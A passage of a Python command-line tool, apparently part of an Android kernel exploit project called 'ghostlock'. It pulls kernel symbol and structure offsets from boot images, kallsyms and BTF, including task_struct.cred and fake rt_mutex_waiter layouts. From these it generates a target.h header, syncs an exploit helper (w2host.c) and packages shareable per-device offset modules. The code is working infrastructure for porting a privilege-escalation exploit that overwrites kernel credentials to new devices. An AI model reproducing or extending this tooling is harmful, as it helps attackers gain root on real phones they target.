        if len(devs) == 1:
            serial = devs[0]
        elif len(devs) > 1 and use_devicetree:
            raise SystemExit("FATAL: 多台设备, 用 --serial 指定")
    if not serial:
        raise SystemExit(
            "FATAL: 需要 --iomem <文件> / --devicetree (设备在线) / --serial <sn>")

    if use_devicetree:
        ram_start = _read_devicetree_memory_adb(serial)
        phys_offset = ram_start & -_ARM64_MEMSTART_ALIGN
        if ram_start - phys_offset >= _ARM64_MEMSTART_ALIGN:
            raise SystemExit("FATAL: PHYS_OFFSET 向下取整不变式失败")
        kernel_phys_load = phys_offset   # 推定 (root detect-p0 可复核)
        print("来源: adb %s (devicetree, 非 root)" % serial)
        print("p0_phys_offset: %#x (RAM 起点 %#x 向下 1GiB 对齐)" % (phys_offset, ram_start))
        print("p0_kernel_phys_load: %#x (推定 = phys_offset; root 下 detect-p0 可精确复核)"
              % kernel_phys_load)
        if write_profile:
            _update_profile_p0(write_profile, phys_offset, kernel_phys_load)
        return 0

    # 缺省: 先试 devicetree (非 root), 失败再试 root iomem
    try:
        ram_start = _read_devicetree_memory_adb(serial)
        phys_offset = ram_start & -_ARM64_MEMSTART_ALIGN
        print("来源: adb %s (devicetree 自动)" % serial)
        print("p0_phys_offset: %#x (RAM 起点 %#x 向下 1GiB 对齐)" % (phys_offset, ram_start))
        print("p0_kernel_phys_load: %#x (推定; root 下 detect-p0 可精确复核)" % phys_offset)
        if write_profile:
            _update_profile_p0(write_profile, phys_offset, phys_offset)
        return 0
    except SystemExit:
        text = _read_iomem_adb(serial)
        phys_offset, kernel_phys_load = _detect_p0_from_iomem(text)
        print("来源: adb %s (su iomem)" % serial)
        print("p0_phys_offset: %#x" % phys_offset)
        print("p0_kernel_phys_load: %#x" % kernel_phys_load)
        print("校验: 通过 (1GiB 对齐 / 页对齐 / RAM 包含 / code 回推)")
        if write_profile:
            _update_profile_p0(write_profile, phys_offset, kernel_phys_load)
        return 0


# ============================================================
# 8.8 package / verify-device (机型模块整合与校验)
# ============================================================

_LAYOUT_TEMPLATE_FIELDS = ("p0_page_offset", "identity_start", "identity_end",
                           "direct_map_base", "direct_map_end", "vmemmap_start",
                           "physmap_base")


def _release_family(release):
    m = re.search(r"g([0-9a-f]{6,})", release)
    return m.group(1) if m else ""


def _find_fdt_memory_dtb(data):
    """在数据中搜索含 memory 节点的 FDT (magic 0xd00dfeed, 4 对齐), 返回 dtb 字节或 None.
    boot v2 的 dtb 段 / vendor_boot v3/v4 的 dtb 段均适用."""
    pos = 0
    while True:
        pos = data.find(b"\xd0\x0d\xfe\xed", pos)
        if pos < 0 or pos + 40 > len(data):
            return None
        if pos & 3 == 0:
            total = struct.unpack_from(">I", data, pos + 4)[0]
            chunk = data[pos:min(pos + total, len(data))]
            if _parse_fdt_memory(chunk) is not None:
                return chunk
        pos += 1


def cmd_package(argv, profile, prof_path):
    """package <素材> --out <devices/名目录> [--device-id <id>] [--soc x] [--family x]
    [--vendor-boot <img>] [--force]
    自动提取全套并整合为可分享机型模块 (device.json + 偏移产物 + manifest).
    未收录机型自动生成并保存 (verified=false, P0 物理常量待 detect-p0/手动)."""
    if len(argv) < 1:
        raise SystemExit("FATAL: package 需要素材 (boot.img / kernel.raw / kernel.elf)")
    asset = argv[0]
    out_dir = None
    device_id = None
    soc = None
    family = None
    force = False
    vendor_boot = None
    if "--out" in argv:
        out_dir = argv[argv.index("--out") + 1]
    if "--device-id" in argv:
        device_id = argv[argv.index("--device-id") + 1]
    if "--soc" in argv:
        soc = argv[argv.index("--soc") + 1]
    if "--family" in argv:
        family = argv[argv.index("--family") + 1]
    if "--force" in argv:
        force = True
    if "--vendor-boot" in argv:
        vendor_boot = argv[argv.index("--vendor-boot") + 1]
        if not os.path.exists(vendor_boot):
            raise SystemExit("FATAL: vendor_boot 不存在: %s" % vendor_boot)
    if out_dir is None:
        raise SystemExit("FATAL: package 需要 --out <devices/名目录>")
    if not os.path.exists(asset):
        raise SystemExit("FATAL: 素材不存在: %s" % asset)

    # 1. 离线恢复 (kallsyms/BTF + release + kimage_text_base)
    tmp = tempfile.mkdtemp(prefix="ghostlock_pkg_")
    try:
        cmd_offline([asset, "--out-dir", tmp], profile, prof_path)
        meta = json.load(open(os.path.join(tmp, "offline_meta.json"), encoding="utf-8"))
        release = meta.get("release")
        if not release:
            raise SystemExit("FATAL: package 未能提取内核 release")
        ks = os.path.join(tmp, "kallsyms.txt")
        btf = os.path.join(tmp, "vmlinux.btf")
        if not os.path.exists(ks) or not os.path.exists(btf):
            raise SystemExit("FATAL: offline 未产出 kallsyms/BTF")
    except SystemExit as e:
        shutil.rmtree(tmp, ignore_errors=True)
        raise

    # 2. 已收录检测 (exact 拦截; family 同族允许生成精确模块; --force 重建)
    djp_existing, level = find_device(release)
    if djp_existing and level == "exact" and not force:
        print("已存在匹配模块: %s (%s)。如需重新生成请加 --force。"
              % (djp_existing, level))
        shutil.rmtree(tmp, ignore_errors=True)
        return 0
    if djp_existing and level == "family":
        print("存在同族模块 %s; 将生成该构建的精确模块。" % djp_existing)

    os.makedirs(out_dir, exist_ok=True)
    did = device_id or os.path.basename(os.path.normpath(out_dir))

    # 3. task_cred_off 自动推导 (BTF task_struct.cred; 不同构建不同, 不能依赖 profile 默认值)
    #    先于 winoffs 生成, 避免 w2host 采样窗口因偏移错误而空 (b57=0x820, 其他构建如 0x8c8)
    tco = None
    try:
        types = parse_btf_full(btf)
        hits = btf_find(types, "task_struct")
        if hits:
            t = max(hits, key=lambda x: len(x["members"]))
            tco = btf_member(types, t, "cred")
    except Exception:
        pass
    if tco is None:
        tco = int(profile["task_cred_off"], 16)
        print("WARN: BTF 未推导 task_struct.cred, 回退 profile task_cred_off=%#x" % tco)
    else:
        print("task_struct.cred = %#x (BTF 推导)" % tco)

    # 4. winoffs: kernel.elf 素材走 ELF 路径; bootimg/kernel_raw 走 Image 直反汇编 (无需 vmlinux-to-elf)
    wo = None
    elf_cand = None
    if _asset_kind(asset) == "kernel_elf":
        elf_cand = asset
    if elf_cand and os.path.exists(elf_cand):
        try:
            wo = os.path.join(out_dir, "win_offs.json")
            gen_winoffs(elf_cand, tco, wo, profile)
        except SystemExit as e:
            print("WARN: winoffs 未生成 (%s); 模块缺 win_offs.json" % e)
    else:
        try:
            wo = os.path.join(out_dir, "win_offs.json")
            # 离线 kallsyms 已在 tmp 目录 (kallsyms.txt); 素材为 bootimg/raw -> Image 直反汇编
            # (winoffs-image 内部处理 boot.img 内核段提取与压缩解压, 无需 vmlinux-to-elf)
            ks_off = os.path.join(tmp, "kallsyms.txt")
            cmd_winoffs_image([asset, ks_off, wo, "--task-cred-off", hex(tco)],
                              profile, prof_path)
            print("winoffs-image OK (无 vmlinux-to-elf): %s" % wo)
        except SystemExit as e:
            print("WARN: winoffs-image 未生成 (%s); 模块缺 win_offs.json" % e)

    # 更新 win_offs.json 元数据为新机型 (模块自包含; 数值不变)
    if os.path.exists(wo):
        try:
            wo_data = json.load(open(wo, encoding="utf-8"))
            wo_data["kernel_release"] = release
            wo_data["family"] = family or _release_family(release) or "auto"
            wo_data["kimage_text_base"] = meta.get("relative_base") or \
                wo_data.get("kimage_text_base")
            json.dump(wo_data, open(wo, "w", encoding="utf-8"), indent=2,
                      ensure_ascii=False)
        except Exception as e:
            print("WARN: win_offs.json 元数据更新失败 (%s)" % e)

    # 5. derive-pselect (objdump 可用且 elf 可用; 可选)
    psel_path = None
    if elf_cand and os.path.exists(elf_cand):
        od = _find_objdump()
        if od is not None:
            try:
                psel_path = os.path.join(out_dir, "pselect.json")
                cmd_derive_pselect([elf_cand, "--kallsyms", ks, "--btf", btf,
                                    "-o", psel_path], profile, prof_path)
            except SystemExit as e:
                print("WARN: pselect 推导未完成 (%s); 模块缺 pselect.json" % e)
                psel_path = None

    # 6. header (target.h)
    try:
        hdr = os.path.join(out_dir, "target.h")
        psel_args = []
        if psel_path and os.path.exists(psel_path):
            psel_args = ["--pselect", psel_path]
        cmd_header_from_files(ks, btf, hdr, profile, psel_args)
    except SystemExit as e:
        print("WARN: header 生成失败 (%s); 模块缺 target.h" % e)

    # 7. device.json (参数: 自动填 kimage_text_base/task_cred_off; P0 物理由 devicetree/DTB 自动或待填)
    layout = {k: profile[k] for k in _LAYOUT_TEMPLATE_FIELDS}
    tco_str = ("0x%x" % tco) if tco else "0x820"
    # P0 自动填充: 素材 DTB (boot v2 dtb 段 / vendor_boot dtb 段) -> phys_offset
    p0_phys = None
    p0_load = None
    p0_note = "p0_phys_offset/p0_kernel_phys_load 待填: detect-p0 (已 root 或设备在线 devicetree) 或手动; 填后 verified 可置 true"
    fdt_src = None
    if _asset_kind(asset) == "bootimg":
        fdt_src = _find_fdt_memory_dtb(open(asset, "rb").read())
    if fdt_src is None and vendor_boot:
        fdt_src = _find_fdt_memory_dtb(open(vendor_boot, "rb").read())
    if fdt_src is not None:
        ram_start = _parse_fdt_memory(fdt_src)
        if ram_start is not None:
            p0_phys = ram_start & -_ARM64_MEMSTART_ALIGN
            p0_load = p0_phys          # 推定 (root detect-p0 可复核)
            p0_note = ("p0_phys_offset 自动取自素材 DTB (RAM 起点 %#x); "
                       "p0_kernel_phys_load 推定 = phys_offset (root detect-p0 可精确复核)"
                       % ram_start)
    dev = {
        "id": did,
        "device": "unknown (auto-generated, id=%s)" % did,
        "kernel_release": release,
        "family": family or _release_family(release) or "auto",
        "soc": soc or "unknown",
        "variant": "generated",
        "fingerprint": "",
        "kimage_text_base": meta.get("relative_base"),
        "p0_page_offset": layout["p0_page_offset"],
        "p0_phys_offset": ("0x%x" % p0_phys) if p0_phys else None,
        "p0_kernel_phys_load": ("0x%x" % p0_load) if p0_load else None,
        "identity_start": layout["identity_start"],
        "identity_end": layout["identity_end"],
        "direct_map_base": layout["direct_map_base"],
        "direct_map_end": layout["direct_map_end"],
        "vmemmap_start": layout["vmemmap_start"],
        "physmap_base": layout["physmap_base"],
        "task_cred_off": tco_str,
        "w2_cand_min": "0xffffff8040000000",
        "w2_direct_end": "0xffffff8400000000",
        "verified": False,
        "source": "generated",
        "created": __import__("datetime").datetime.now().strftime(
            "%Y-%m-%dT%H:%M:%S+08:00"),
        "notes": "自动生成模块。%s" % p0_note,
    }
    json.dump(dev, open(os.path.join(out_dir, "device.json"), "w", encoding="utf-8"),
              indent=2, ensure_ascii=False)

    # 7. manifest
    files = {}
    for name in ("device.json", "win_offs.json", "offsets.json",
                 "target.h", "pselect.json"):
        p = os.path.join(out_dir, name)
        if os.path.exists(p):
            files[name] = hashlib.sha256(open(p, "rb").read()).hexdigest()
    manifest = {
        "module": did,
        "device": dev["device"],
        "kernel_release": release,
        "created": dev["created"],
        "verified": False,
        "source": "generated",
        "files": files,
        "files_optional": ["offsets.json", "target.h", "pselect.json"],
    }
    json.dump(manifest, open(os.path.join(out_dir, "manifest.json"), "w"),
              indent=2, ensure_ascii=False)
    shutil.rmtree(tmp, ignore_errors=True)

    print("=" * 60)
    print("机型模块已生成: %s" % out_dir)
    print("  分享: 打包该目录为 zip, 或直接拷贝目录到他人 devices/ 下")
    if p0_phys:
        print("  P0: p0_phys_offset=%#x / p0_kernel_phys_load=%#x (素材 DTB 自动填充,"
              " 建议 root detect-p0 精确复核)" % (p0_phys, p0_load or 0))
    else:
        print("  待填: p0_phys_offset / p0_kernel_phys_load (detect-p0 或手动),"
              " 填后 verified=true")
    print("  verify: offsets_auto.py verify-device %s" % did)
    print("=" * 60)
    return 0


def cmd_header_from_files(ks, btf, out_h, profile, psel_args=None):
    """header 子命令的公共入口 (从文件生成 target.h)."""
    psel_shift = 0
    psel_nfds = 264
    if psel_args:
        psel = psel_args[psel_args.index("--pselect") + 1]
        if os.path.exists(psel):
            psel_data = json.load(open(psel, encoding="utf-8"))
            psel_shift = psel_data.get("psselect_waiter_word_shift", 0)
            psel_nfds = psel_data.get("pselect_route_nfds", 264)
    syms, stype, sym_all = parse_kallsyms(ks)
    types = parse_btf_full(btf)
    sym_off, missing_sym, runtime, base = extract_symbols(syms, stype, sym_all)
    btf_off, missing_btf, extra = extract_btf(types)
    hdr = gen_header(sym_off, btf_off, {
        "ts": __import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "extra": os.path.basename(ks) + " + " + os.path.basename(btf),
        "kimage_base": profile["kimage_text_base"],
        "p0_page_offset": profile["p0_page_offset"],
        "p0_phys_offset": profile["p0_phys_offset"],
        "p0_kernel_phys_load": profile["p0_kernel_phys_load"],
        "identity_start": profile["identity_start"],
        "identity_end": profile["identity_end"],
        "direct_map_base": profile["direct_map_base"],
        "direct_map_end": profile["direct_map_end"],
        "vmemmap_start": profile["vmemmap_start"],
        "variant": profile["variant"],
        "fingerprint": profile["fingerprint"],
        "psselect_waiter_word_shift": psel_shift,
        "psselect_route_nfds": psel_nfds,
    })
    open(out_h, "w", encoding="utf-8", newline="").write(hdr)
    print("header saved:", out_h)
    return hdr


def cmd_verify_device(argv, profile, prof_path):
    """verify-device <名>: 按 manifest SHA256 校验模块完整性."""
    if not argv:
        raise SystemExit("FATAL: verify-device 需要机型名")
    name = argv[0]
    djp = _find_device_json(name)
    if djp is None:
        raise SystemExit("FATAL: 找不到机型模块: %s" % name)
    dev_dir = os.path.dirname(djp)
    mjp = os.path.join(dev_dir, "manifest.json")
    if not os.path.exists(mjp):
        raise SystemExit("FATAL: 模块缺 manifest.json: %s" % dev_dir)
    mj = json.load(open(mjp, encoding="utf-8"))
    ok = True
    for fn, sha in mj.get("files", {}).items():
        p = os.path.join(dev_dir, fn)
        if not os.path.exists(p):
            print("  MISSING %s" % fn)
            ok = False
            continue
        h = hashlib.sha256(open(p, "rb").read()).hexdigest()
        if h != sha:
            print("  CORRUPT %s (sha256 不匹配)" % fn)
            ok = False
    if ok:
        print("verify-device %s: OK (%d 文件校验通过)" % (name, len(mj.get("files", {}))))
    else:
        print("verify-device %s: FAIL (见上)" % name)
    return 0 if ok else 1

def main():
    argv = sys.argv[1:]
    if not argv:
        print(__doc__)
        sys.exit(1)
    if argv[0] in ("-h", "--help", "help"):
        print(__doc__)
        return
    cmd = argv[0]
    rest = list(argv[1:])
    # 全局 --profile (任意位置); 缺省 profiles/x200_b57.json
    prof_path = None
    if "--profile" in rest:
        i = rest.index("--profile")
        if i + 1 >= len(rest):
            raise SystemExit("FATAL: --profile 缺少参数")
        prof_path = rest[i + 1]
        del rest[i:i + 2]
    profile = load_profile(prof_path)

    if cmd not in ("live", "header", "winoffs", "all", "feasibility",
                   "offline", "derive-pselect", "detect-p0",
                   "package", "verify-device", "winoffs-image"):
        # 兼容旧版: 4 个位置参数 = live
        if len(argv) < 4:
            raise SystemExit("FATAL: 未知子命令: %r (用 --help 查看用法)" % cmd)
        gen_live(*argv[:4])
        return

    if cmd == "feasibility":
        return cmd_feasibility(rest, profile, prof_path)

    if cmd == "offline":
        return cmd_offline(rest, profile, prof_path)

    if cmd == "derive-pselect":
        return cmd_derive_pselect(rest, profile, prof_path)

    if cmd == "detect-p0":
        return cmd_detect_p0(rest, profile, prof_path)

    if cmd == "package":
        return cmd_package(rest, profile, prof_path)

    if cmd == "verify-device":
        return cmd_verify_device(rest, profile, prof_path)

    if cmd == "live":
        if len(rest) < 4:
            raise SystemExit("FATAL: live 需要 4 个参数: kallsyms btf win_offs out")
        gen_live(rest[0], rest[1], rest[2], rest[3], profile)
        return

    if cmd == "winoffs":
        if len(rest) < 2:
            raise SystemExit("FATAL: winoffs 需要 2 个参数: kernel.elf out.json")
        elf = rest[0]
        out = rest[1]
        # 默认取 profile.task_cred_off (6.6 b57=0x820, 6.12=0x900 等), 可用 --task-cred-off 覆盖
        tco = int(profile["task_cred_off"], 16)
        if "--task-cred-off" in rest:
            tco = int(rest[rest.index("--task-cred-off") + 1], 16)
        gen_winoffs(elf, tco, out, profile)
        return

    if cmd == "winoffs-image":
        return cmd_winoffs_image(rest, profile, prof_path)

    if cmd in ("header", "all"):
        if len(rest) < 2:
            raise SystemExit("FATAL: header/all 需要 kallsyms + btf")
        ks, btf = rest[0], rest[1]
        out_h = None
        w2host = None
        diff_h = None
        tail = rest[2:]
        if "-o" in tail:
            out_h = tail[tail.index("-o") + 1]
        if "--w2host" in tail:
            w2host = tail[tail.index("--w2host") + 1]
        if "--diff" in tail:
            diff_h = tail[tail.index("--diff") + 1]
        psel_shift = 0
        psel_nfds = 264
        if "--pselect" in tail:
            pj = tail[tail.index("--pselect") + 1]
            if os.path.exists(pj):
                psel_data = json.load(open(pj, encoding="utf-8"))
                psel_shift = psel_data.get("psselect_waiter_word_shift", 0)
                psel_nfds = psel_data.get("pselect_route_nfds", 264)
            else:
                raise SystemExit("FATAL: --pselect 文件不存在: %s" % pj)
        if cmd == "all":
            # all <kallsyms> <btf> <elf> <outdir>
            if len(rest) < 4:
                raise SystemExit("FATAL: all 需要 4 个参数: kallsyms btf elf outdir")
            elf = rest[2]
            outdir = rest[3]
            os.makedirs(outdir, exist_ok=True)
            out_h = os.path.join(outdir, "target_x200.h")
            winoffs_out = os.path.join(outdir, "win_offs.json")
            gen_winoffs(elf, int(profile["task_cred_off"], 16), winoffs_out, profile)
            gen_live(ks, btf, winoffs_out, os.path.join(outdir, "offsets.json"), profile)

        syms, stype, sym_all = parse_kallsyms(ks)
        types = parse_btf_full(btf)
        sym_off, missing_sym, runtime, base = extract_symbols(syms, stype, sym_all)
        btf_off, missing_btf, extra = extract_btf(types)
        missing = missing_sym + missing_btf

        hdr = gen_header(sym_off, btf_off, {
            "ts": __import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "extra": os.path.basename(ks) + " + " + os.path.basename(btf),
            "kimage_base": profile["kimage_text_base"],
            "p0_page_offset": profile["p0_page_offset"],
            "p0_phys_offset": profile["p0_phys_offset"],
            "p0_kernel_phys_load": profile["p0_kernel_phys_load"],
            "identity_start": profile["identity_start"],
            "identity_end": profile["identity_end"],
            "direct_map_base": profile["direct_map_base"],
            "direct_map_end": profile["direct_map_end"],
            "vmemmap_start": profile["vmemmap_start"],
            "variant": profile["variant"],
            "fingerprint": profile["fingerprint"],
            "psselect_waiter_word_shift": psel_shift,
            "psselect_route_nfds": psel_nfds,
        })

        # 对比旧头文件 (按数值比较, 忽略进制/前导零格式差异)
        if diff_h and os.path.exists(diff_h):
            old = open(diff_h, encoding="utf-8").read()
            old_defs = {k: int(v, 0) for k, v in
                        re.findall(r"#define\s+(\w+_OFF)\s+(0x[0-9a-fA-F]+|\d+)", old)}
            new_defs = {k: int(v, 0) for k, v in
                        re.findall(r"#define\s+(\w+_OFF)\s+(0x[0-9a-fA-F]+|\d+)", hdr)}
            diffs = []
            for k in sorted(set(old_defs) | set(new_defs)):
                o, n = old_defs.get(k), new_defs.get(k)
                if o != n:
                    diffs.append((k, o, n))
            print("=== 与旧头文件对比 (值比较) ===")
            if diffs:
                for k, o, n in diffs:
                    print("  DIFF %-36s 0x%x -> 0x%x" % (k, o if o is not None else 0,
                                                         n if n is not None else 0))
            else:
                print("  ALL MATCH (无差异)")

        if missing:
            print("WARN: 以下必需偏移未提取到 (生成仍继续, 但请勿用于实机):")
            for define, what in missing:
                print("  %-36s %s" % (define, what))

        if out_h:
            open(out_h, "w", encoding="utf-8", newline="").write(hdr)
            print("header saved:", out_h)
        else:
            print(hdr)

        # 校验 FAKE_WAITER_* 与真实 rt_mutex_waiter 一致性
        rtw = extra.get("rt_mutex_waiter")
        if rtw:
            fake_map = {"pi_tree": "FAKE_WAITER_PI_TREE_ENTRY_OFF",
                        "task": "FAKE_WAITER_TASK_OFF",
                        "lock": "FAKE_WAITER_LOCK_OFF",
                        "wake_state": "FAKE_WAITER_WAKE_STATE_OFF",
                        "ww_ctx": "FAKE_WAITER_WW_CTX_OFF"}
            for fld, define in fake_map.items():
                if fld in rtw:
                    print("  check %s: BTF=%#x (fake 布局应与真实一致)" % (
                        define, rtw[fld]))

        # 同步 w2host.c
        if w2host and os.path.exists(w2host):
            changed = patch_w2host(w2host, btf_off)
            if changed:
                print("w2host.c 已同步:", changed)
            else:
                print("w2host.c: 无需修改")


if __name__ == "__main__":
    main()
